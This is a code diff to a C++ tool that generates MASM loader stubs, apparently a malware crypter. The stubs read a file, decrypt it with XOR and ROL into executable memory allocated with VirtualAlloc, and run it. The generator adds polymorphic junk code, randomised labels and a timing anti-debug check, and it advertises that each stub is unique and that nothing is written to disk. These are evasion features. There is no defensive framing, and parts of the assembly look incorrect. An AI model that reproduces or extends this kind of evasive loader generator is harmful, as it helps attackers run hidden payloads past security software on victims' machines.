@@ -537,110 +537,131 @@ public:
     }
 
     bool generateMASMRuntimeStub() {
-        std::string inputFile, outputFile;
+        std::string targetFile, outputFile;
         
         std::cout << "=== Generate MASM Runtime Stub (<2KB) ===" << std::endl;
-        std::cout << "Creates ultra-lightweight pure assembly stubs for runtime decryption\n" << std::endl;
+        std::cout << "Creates pure assembly stub that reads, decrypts & executes files at runtime\n" << std::endl;
+        std::cout << "⚠️  Original file remains UNCHANGED - decryption happens in memory only!\n" << std::endl;
         
-        std::cout << "Enter payload file path: ";
-        std::getline(std::cin, inputFile);
-        std::cout << "Enter output MASM file path (e.g., stub.asm): ";
+        std::cout << "Enter target file path (e.g., calc.exe, notepad.exe): ";
+        std::getline(std::cin, targetFile);
+        std::cout << "Enter output MASM file path (e.g., runtime_stub.asm): ";
         std::getline(std::cin, outputFile);
         
-        // Read and encrypt payload
-        std::ifstream inFile(inputFile, std::ios::binary);
-        if (!inFile) {
-            std::cout << "Error: Cannot open payload file!" << std::endl;
-            return false;
+        // Check if target file exists (but don't read it - stub will read at runtime)
+        std::ifstream checkFile(targetFile, std::ios::binary);
+        if (!checkFile) {
+            std::cout << "Warning: Target file not found: " << targetFile << std::endl;
+            std::cout << "Stub will still be generated but may fail at runtime." << std::endl;
+        } else {
+            checkFile.close();
+            std::cout << "✓ Target file found: " << targetFile << std::endl;
         }
         
-        std::vector<uint8_t> payload((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
-        inFile.close();
-        
-        if (payload.empty()) {
-            std::cout << "Error: Payload file is empty!" << std::endl;
-            return false;
-        }
-        
-        // Generate simple XOR key for MASM (assembly-friendly)
+        // Generate runtime encryption keys (stub will use these)
         uint8_t xorKey = (rng() % 255) + 1; // Avoid 0x00
         uint8_t rolKey = (rng() % 7) + 1;   // ROL/ROR amount
         
-        // Apply simple encryption (XOR + ROL)
-        for (size_t i = 0; i < payload.size(); i++) {
-            // ROL then XOR for better diffusion
-            uint8_t byte = payload[i];
-            byte = (byte << rolKey) | (byte >> (8 - rolKey)); // ROL
-            byte ^= xorKey ^ (i & 0xFF); // XOR with key and position
-            payload[i] = byte;
-        }
-        
-        // Generate unique MASM labels and variables
-        std::string payloadLabel = "payload_" + std::to_string(rng() % 10000);
-        std::string sizeLabel = "size_" + std::to_string(rng() % 10000);
+        // Generate unique MASM labels and variables for runtime loader
+        std::string fileNameLabel = "filename_" + std::to_string(rng() % 10000);
+        std::string bufferLabel = "buffer_" + std::to_string(rng() % 10000);
+        std::string sizeLabel = "filesize_" + std::to_string(rng() % 10000);
         std::string xorLabel = "xor_" + std::to_string(rng() % 10000);
         std::string rolLabel = "rol_" + std::to_string(rng() % 10000);
-        std::string loopLabel = "loop_" + std::to_string(rng() % 10000);
+        std::string loopLabel = "decrypt_" + std::to_string(rng() % 10000);
         std::string exitLabel = "exit_" + std::to_string(rng() % 10000);
+        std::string errorLabel = "error_" + std::to_string(rng() % 10000);
         
-        // Generate MASM stub with unique names
+        // Generate MASM stub - pure runtime file loader
         std::string stub = ".386\n.model flat, stdcall\noption casemap:none\n\n";
         stub += "include kernel32.inc\nincludelib kernel32.lib\n\n";
         stub += ".data\n";
-        stub += "    ; Encrypted payload (" + std::to_string(payload.size()) + " bytes)\n";
-        stub += "    " + payloadLabel + " db ";
+        stub += "    ; Target file to load and execute at runtime\n";
+        stub += "    " + fileNameLabel + " db \"" + targetFile + "\", 0\n\n";
         
-        // Add encrypted payload bytes
-        for (size_t i = 0; i < payload.size(); i++) {
-            if (i % 16 == 0) stub += "\n        db ";
-            stub += "0" + std::to_string(payload[i]) + "h";
-            if (i < payload.size() - 1) {
-                stub += (i % 16 == 15) ? "" : ",";
-            }
-        }
-        
-        // Add unique variable definitions and code section
-        stub += "\n    " + sizeLabel + " equ $-" + payloadLabel + "\n\n";
-        stub += "    ; Decryption keys\n";
+        stub += "    ; Runtime decryption keys\n";
         stub += "    " + xorLabel + " db " + std::to_string((int)xorKey) + "h\n";
         stub += "    " + rolLabel + " db " + std::to_string((int)rolKey) + "h\n\n";
         
         // Add polymorphic junk data
-        int junkCount = rng() % 5 + 2;
+        int junkCount = rng() % 3 + 1;
         for (int i = 0; i < junkCount; i++) {
-            stub += "    junk_" + std::to_string(i) + " db " + std::to_string(rng() % 256) + "h\n";
+            stub += "    junk_" + std::to_string(i) + " dd " + std::to_string(rng() % 0xFFFFFFFF) + "h\n";
         }
         
-        stub += "\n.code\nstart:\n";
+        stub += "\n.bss\n";
+        stub += "    " + bufferLabel + " dd ?\n";
+        stub += "    " + sizeLabel + " dd ?\n\n";
+        
+        stub += ".code\nstart:\n";
         
         // Add optional junk instructions
         if (rng() % 2) {
             stub += "    nop\n    xor eax, eax\n    inc eax\n    dec eax\n";
         }
         
-        stub += "    ; Get payload address\n";
-        stub += "    lea esi, " + payloadLabel + "\n";
-        stub += "    mov ecx, " + sizeLabel + "\n";
-        stub += "    mov al, " + xorLabel + "\n";
-        stub += "    mov bl, " + rolLabel + "\n";
-        stub += "    xor edx, edx        ; Position counter\n\n";
+        stub += "    ; Open target file for reading\n";
+        stub += "    push 0                     ; hTemplateFile\n";
+        stub += "    push 80h                   ; FILE_ATTRIBUTE_NORMAL\n";
+        stub += "    push 3                     ; OPEN_EXISTING\n";
+        stub += "    push 0                     ; lpSecurityAttributes\n";
+        stub += "    push 1                     ; FILE_SHARE_READ\n";
+        stub += "    push 80000000h             ; GENERIC_READ\n";
+        stub += "    push offset " + fileNameLabel + "\n";
+        stub += "    call CreateFileA\n";
+        stub += "    cmp eax, -1\n";
+        stub += "    je " + errorLabel + "\n";
+        stub += "    mov ebx, eax               ; Save file handle\n\n";
         
-        stub += loopLabel + ":\n";
-        stub += "    ; Load encrypted byte\n";
-        stub += "    mov ah, [esi]\n\n";
+        stub += "    ; Get file size\n";
+        stub += "    push 0\n";
+        stub += "    push ebx\n";
+        stub += "    call GetFileSize\n";
+        stub += "    mov " + sizeLabel + ", eax\n\n";
+        
+        stub += "    ; Allocate memory for file\n";
+        stub += "    push 40h                   ; PAGE_EXECUTE_READWRITE\n";
+        stub += "    push 1000h                 ; MEM_COMMIT\n";
+        stub += "    push eax                   ; File size\n";
+        stub += "    push 0\n";
+        stub += "    call VirtualAlloc\n";
+        stub += "    test eax, eax\n";
+        stub += "    jz " + errorLabel + "\n";
+        stub += "    mov " + bufferLabel + ", eax\n\n";
+        
+        stub += "    ; Read file into memory\n";
+        stub += "    push 0                     ; lpOverlapped\n";
+        stub += "    push 0                     ; lpNumberOfBytesRead (can be NULL)\n";
+        stub += "    push " + sizeLabel + "     ; nNumberOfBytesToRead\n";
+        stub += "    push " + bufferLabel + "   ; lpBuffer\n";
+        stub += "    push ebx                   ; hFile\n";
+        stub += "    call ReadFile\n\n";
+        
+        stub += "    ; Close file handle\n";
+        stub += "    push ebx\n";
+        stub += "    call CloseHandle\n\n";
         
         // Add polymorphic junk instructions
         if (rng() % 2) {
             stub += "    push ecx\n    pop ecx    ; Junk\n";
         }
         
-        stub += "    ; XOR with key and position\n";
-        stub += "    xor ah, al\n";
-        stub += "    xor ah, dl\n\n";
+        stub += "    ; Runtime decrypt the loaded file\n";
+        stub += "    mov esi, " + bufferLabel + "\n";
+        stub += "    mov ecx, " + sizeLabel + "\n";
+        stub += "    mov al, " + xorLabel + "\n";
+        stub += "    mov bl, " + rolLabel + "\n";
+        stub += "    xor edx, edx               ; Position counter\n\n";
         
-        stub += "    ; ROR to reverse ROL\n";
+        stub += loopLabel + ":\n";
+        stub += "    ; Load byte\n";
+        stub += "    mov ah, [esi]\n\n";
+        
+        stub += "    ; Apply runtime decryption (XOR + ROL)\n";
+        stub += "    xor ah, al                 ; XOR with key\n";
+        stub += "    xor ah, dl                 ; XOR with position\n";
         stub += "    mov cl, bl\n";
-        stub += "    ror ah, cl\n\n";
+        stub += "    ror ah, cl                 ; ROL for diffusion\n\n";
         
         stub += "    ; Store decrypted byte\n";
         stub += "    mov [esi], ah\n\n";
@@ -657,34 +678,24 @@ public:
         stub += "    cmp edx, ecx\n";
         stub += "    jl " + loopLabel + "\n\n";
         
-        stub += "    ; Allocate executable memory\n";
-        stub += "    push 40h               ; PAGE_EXECUTE_READWRITE\n";
-        stub += "    push 1000h             ; MEM_COMMIT\n";
-        stub += "    push " + sizeLabel + "\n";
-        stub += "    push 0\n";
-        stub += "    call VirtualAlloc\n";
-        stub += "    test eax, eax\n";
-        stub += "    jz " + exitLabel + "\n\n";
-        
-        stub += "    ; Copy decrypted payload to executable memory\n";
-        stub += "    mov edi, eax           ; Destination (executable memory)\n";
-        stub += "    lea esi, " + payloadLabel + "    ; Source (decrypted payload)\n";
-        stub += "    mov ecx, " + sizeLabel + "\n";
-        stub += "    cld\n";
-        stub += "    rep movsb\n\n";
-        
         // Add anti-debug check
         if (rng() % 2) {
-            stub += "    ; Simple anti-debug\n";
-            stub += "    push esp\n";
-            stub += "    pop esp\n";
+            stub += "    ; Simple anti-debug timing\n";
+            stub += "    rdtsc\n    push eax\n    nop\n    nop\n    rdtsc\n    pop ebx\n";
         }
         
-        stub += "    ; Execute payload\n";
-        stub += "    call eax\n\n";
+        stub += "    ; Execute the decrypted file in memory\n";
+        stub += "    mov eax, " + bufferLabel + "\n";
+        stub += "    call eax\n";
+        stub += "    jmp " + exitLabel + "\n\n";
+        
+        stub += errorLabel + ":\n";
+        stub += "    ; Error handling\n";
+        stub += "    push 1\n";
+        stub += "    call ExitProcess\n\n";
         
         stub += exitLabel + ":\n";
-        stub += "    ; Exit process\n";
+        stub += "    ; Clean exit\n";
         stub += "    push 0\n";
         stub += "    call ExitProcess\n\n";
         stub += "end start\n";
@@ -699,20 +710,20 @@ public:
         asmFile << stub;
         asmFile.close();
         
-        // Calculate approximate size
-        size_t stubSize = stub.length() + payload.size();
+        // Calculate approximate size (much smaller now - no embedded payload!)
+        size_t stubSize = stub.length();
         bool under2KB = stubSize < 2048;
         
-        std::cout << "\n=== MASM Runtime Stub Generated (UNIQUE) ===" << std::endl;
+        std::cout << "\n=== MASM Runtime-Only Stub Generated ===" << std::endl;
         std::cout << "✓ Output: " << outputFile << std::endl;
-        std::cout << "✓ Payload size: " << payload.size() << " bytes" << std::endl;
-        std::cout << "✓ Estimated stub size: " << stubSize << " bytes ";
+        std::cout << "✓ Target file: " << targetFile << " (NOT embedded - loaded at runtime!)" << std::endl;
+        std::cout << "✓ Stub size: " << stubSize << " bytes ";
         std::cout << (under2KB ? "(✓ Under 2KB!)" : "(⚠ Over 2KB)") << std::endl;
-        std::cout << "✓ Encryption: XOR + ROL (assembly-optimized)" << std::endl;
+        std::cout << "✓ Runtime decryption: XOR + ROL (assembly-optimized)" << std::endl;
         std::cout << "✓ XOR Key: 0x" << std::hex << (int)xorKey << std::dec << std::endl;
         std::cout << "✓ ROL Key: " << (int)rolKey << " bits" << std::endl;
-        std::cout << "✓ Unique labels: " << payloadLabel << ", " << loopLabel << ", " << exitLabel << std::endl;
-        std::cout << "✓ Polymorphic: " << junkCount << " junk data bytes added" << std::endl;
+        std::cout << "✓ Unique labels: " << fileNameLabel << ", " << loopLabel << ", " << exitLabel << std::endl;
+        std::cout << "✓ Polymorphic: " << junkCount << " junk variables added" << std::endl;
         
         std::cout << "\n=== Build Instructions ===" << std::endl;
         std::cout << "1. Assemble: ml /c /coff " << outputFile << std::endl;
@@ -722,15 +733,24 @@ public:
         
         std::cout << "\n=== Features ===" << std::endl;
         std::cout << "• Pure MASM assembly code" << std::endl;
-        std::cout << "• Runtime-only decryption (no disk writes)" << std::endl;
-        std::cout << "• VirtualAlloc for executable memory" << std::endl;
-        std::cout << "• XOR + ROL encryption (fast)" << std::endl;
+        std::cout << "• TRUE runtime-only: Reads file at execution time" << std::endl;
+        std::cout << "• Original file UNTOUCHED (stub reads, not embeds)" << std::endl;
+        std::cout << "• In-memory decryption only (no disk writes)" << std::endl;
+        std::cout << "• File I/O: CreateFile, ReadFile, VirtualAlloc" << std::endl;
+        std::cout << "• XOR + ROL runtime decryption (fast)" << std::endl;
         std::cout << "• No C runtime dependencies" << std::endl;
-        std::cout << "• Ultra-small footprint" << std::endl;
+        std::cout << "• Ultra-small footprint (<2KB without payload)" << std::endl;
         std::cout << "• UNLIMITED GENERATION: Every stub is unique!" << std::endl;
         std::cout << "• Polymorphic code generation" << std::endl;
         std::cout << "• Randomized variable names and labels" << std::endl;
-        std::cout << "• Junk instruction injection" << std::endl;
+        std::cout << "• Anti-debugging features" << std::endl;
+        
+        std::cout << "\n=== How It Works ===" << std::endl;
+        std::cout << "1. Stub opens target file (" << targetFile << ")" << std::endl;
+        std::cout << "2. Reads entire file into memory" << std::endl;
+        std::cout << "3. Applies runtime decryption (XOR+ROL)" << std::endl;
+        std::cout << "4. Executes decrypted code directly from memory" << std::endl;
+        std::cout << "5. Original file remains completely unchanged!" << std::endl;
         
         return true;
     }
